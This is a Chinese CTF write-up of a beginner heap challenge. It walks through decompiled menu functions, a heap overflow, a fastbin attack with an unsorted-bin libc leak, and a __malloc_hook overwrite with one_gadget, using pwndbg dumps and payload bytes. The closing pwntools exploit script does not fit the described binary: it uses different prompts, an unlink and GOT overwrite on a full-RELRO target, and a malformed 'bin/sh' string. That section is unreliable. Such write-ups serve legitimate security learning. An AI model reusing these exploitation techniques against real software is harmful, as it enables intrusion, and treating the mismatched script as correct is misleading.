刚写堆没多久，完全就是摸着石头过河。ai给我挑的入门题目，结果遇见了新手村boss。

![image-20260325234508772](images\image-20260325234508772.png)

菜单

```
void __fastcall add(__int64 a1)
{
  int n15; // [rsp+10h] [rbp-10h]
  int n4096; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( n15 = 0; n15 <= 15; ++n15 )
  {
    if ( !*(_DWORD *)(24LL * n15 + a1) )
    {
      printf("Size: ");
      n4096 = duru();
      if ( n4096 > 0 )
      {
        if ( n4096 > 4096 )
          n4096 = 4096;
        v3 = calloc(n4096, 1u);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * n15 + a1) = 1;
        *(_QWORD *)(a1 + 24LL * n15 + 8) = n4096;
        *(_QWORD *)(a1 + 24LL * n15 + 16) = v3;
        printf("Allocate Index %d\n", n15);
      }
      return;
    }
  }
}
```

堆的创建采用的标记条件是if ( !*(_DWORD *)(24LL * n15 + a1) )，也就是说free之后立即重建标记位不变。

创建的堆地址储存在*(_QWORD *)(a1 + 24LL * n15 + 16)，上方8个字节储存大小。这个函数并没有对堆进行写入。

*(_DWORD *)(24LL * n15 + a1) = 1;这个就是标志位，表明这个地址已经储存了堆地址。

```
_int64 __fastcall fill(__int64 a1)
{
  __int64 n0x10_1; // rax
  int n0x10_2; // [rsp+18h] [rbp-8h]
  int n0x10; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  n0x10_1 = duru();
  n0x10_2 = n0x10_1;
  if ( (unsigned int)n0x10_1 < 0x10 )
  {
    n0x10_1 = *(unsigned int *)(24LL * (int)n0x10_1 + a1);
    if ( (_DWORD)n0x10_1 == 1 )
    {
      printf("Size: ");
      n0x10_1 = duru();
      n0x10 = n0x10_1;
      if ( (int)n0x10_1 > 0 )
      {
        printf("Content: ");
        return sub_11B2(*(_QWORD *)(24LL * n0x10_2 + a1 + 16), n0x10);
      }
    }
  }
  return n0x10_1;
}
```

填充函数里面的size是我们所能控制的，最后会在sub_11B2这个函数内进行写入。很明显的堆溢出。

```
__int64 __fastcall delt(__int64 a1)
{
  __int64 n0x10; // rax
  int n0x10_1; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  n0x10 = duru();
  n0x10_1 = n0x10;
  if ( (unsigned int)n0x10 < 0x10 )
  {
    n0x10 = *(unsigned int *)(24LL * (int)n0x10 + a1);
    if ( (_DWORD)n0x10 == 1 )
    {
      *(_DWORD *)(24LL * n0x10_1 + a1) = 0;
      *(_QWORD *)(24LL * n0x10_1 + a1 + 8) = 0;
      free(*(void **)(24LL * n0x10_1 + a1 + 16));
      n0x10 = 24LL * n0x10_1 + a1;
      *(_QWORD *)(n0x10 + 16) = 0;
    }
  }
  return n0x10;
```

free的函数也没有什么问题，指针清理了，没有UAF，有标志符，双重释放也没有用。

最后的show函数也没什么问题。

看完程序，我就往fastbin，Unsorted Bin Leak泄露got表想。但是

![image-20260326000836797](images\image-20260326000836797.png)

full relro，got表不可修改。当时我就蒙了。

最后还是看大佬的wp才知道__malloc_hook这个后门。之后就是想办法利用fastbin进行任意地址写入。

要想进行fastbinattack至少要有两个chunk，因为要溢出更改fd，所以还要在上面加上一个chunk。最后还要有一个chunk用来隔离防止被topchunk合并，让chunk顺利进入fastbin里面。

创建4个堆块，free掉2跟1之后堆空间大概就是这个样子。

```
pwndbg> heap
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

Allocated chunk | PREV_INUSE
Addr: 0x555555a01000
Size: 0x30 (with flag bits: 0x31)

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555a01030
Size: 0x30 (with flag bits: 0x31)
fd: 0x555555a01060

Free chunk (fastbins) | PREV_INUSE
Addr: 0x555555a01060
Size: 0x30 (with flag bits: 0x31)
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x555555a01090
Size: 0x30 (with flag bits: 0x31)

Top chunk | PREV_INUSE
Addr: 0x555555a010c0
Size: 0x20f40 (with flag bits: 0x20f41)

pwndbg> x/20xg 0x555555a01000
0x555555a01000:	0x0000000000000000	0x0000000000000031
0x555555a01010:	0x0000000000000000	0x0000000000000000
0x555555a01020:	0x0000000000000000	0x0000000000000000
0x555555a01030:	0x0000000000000000	0x0000000000000031
0x555555a01040:	0x0000555555a01060	0x0000000000000000
0x555555a01050:	0x0000000000000000	0x0000000000000000
0x555555a01060:	0x0000000000000000	0x0000000000000031
0x555555a01070:	0x0000000000000000	0x0000000000000000
0x555555a01080:	0x0000000000000000	0x0000000000000000
0x555555a01090:	0x0000000000000000	0x0000000000000031
pwndbg> 
```

这里只是演示，chunk大小还没确定。之后就是利用chunk0进行溢出修改chunk1的fd，这样再申请两个堆块第二个堆块也就是chunk1就会变成我们想要的地址了。这里因为要泄露libc地址，采用的是先将chunk1的范围利用堆溢出改小让chunk1跟chunk2一起进入fastbin，更改fd指向一个大的chunk，也就是说再最开始的时候要申请5个堆块.

chunk0（0x10），用来覆盖chunk1

chunk1（0x10），用来实现双指针指向。

chunk2（0x10），帮助chunk1存在fd

chunk3（0x10），覆盖chunk4.

chunk4（0x90），进入unsortedbin泄露libc地址。

最后整体的泄露思路就是先free掉chunk2，然后是chunk1（fastbin先入后出，相同大小串联）。利用chunk0的溢出去覆盖chunk1此时的fd为chunk4。但是重新申请之前还要先绕过一下fastbin的检查，利用chunk3的溢出覆盖chunk4的大小为chunk1的大小。

之后申请两次0x10，这样chunk1就会指向chunk4。

payload分别为

```
payload1 = b'a'*0x10+p64(0)+p64(0x21)+p8(0x80)
payload3=b'a'*0x10+p64(0)+p64(0x21)
```

之后再次利用chunk3覆盖chunk4的大小为0x90然后再随便申请一个chunk隔离chunk4防止被rop chunk合并。

free掉chunk4之后，chunk4里面的fd跟bk指向的就是libc的地址，由于chunk4的标志符在free之后会被设置为0导致无法读取。但是chunk1此时指向chuk4并且标识符不为0可被读取，show（1）之后就能得到libc里面的一个地址。但是这个地址是什么呢？

![image-20260326110018409](images\image-20260326110018409.png)

这里只能算偏移了。

![image-20260326110122977](images\image-20260326110122977.png)

计算出偏移为0x3c4b78

然后就是利用一个程序员自己在__malloc_hook留的钩子，位置就在0x3c4aed（这个位置有一个0x7a的数据可以当作伪造的chunk的头）。这个位置我是让ai给我查的。这也是我们要去控制的地址。之后是这个从这个位置覆盖到钩子（偏移为0x13），将onegadget（one_gadget ./libc-2.23.so直接查看）放入

再次随意申请一个chunk，就能触发shell了。

```
from pwn import *

context.arch = 'amd64'
r=remote('node5.buuoj.cn',28184)

def add(size,txt):
    r.sendlineafter(b'Your choice :',b'1')
    r.sendlineafter(b'Size of Heap : ',str(size).encode())
    r.sendlineafter(b'Content of heap:',txt)
def delt (index):
    r.sendlineafter(b'Your choice :',b'3')
    r.sendlineafter(b'Index :',str(index).encode())
def re(index,size,txt):
    r.sendlineafter(b'Your choice :',b'2')
    r.sendlineafter(b'Index :',str(index).encode())
    r.sendlineafter(b'Size of Heap :',str(size).encode())
    r.sendlineafter(b'Content of heap :',txt)
add(0x40,b'a'*8)
add(0x80,b'a'*8)
add(0x80,b'a'*8)
add(0x80,b'a'*8)
addr = 0x6020E0
payload= p64(0)+p64(0x41)+p64(addr-0x18)+p64(addr-0x10)+b'a'*0x20+p64(0x40)+p64(0x90)
re(0,0x50,payload)
delt(1)
payload1=b'a'*0x18+p64(0x602068)
re(0,0x20,payload1)
re(0,0x8,p64(0x400700))
r.sendlineafter(b'Your choice :',b'bin/sh\00')
r.interactive()
```

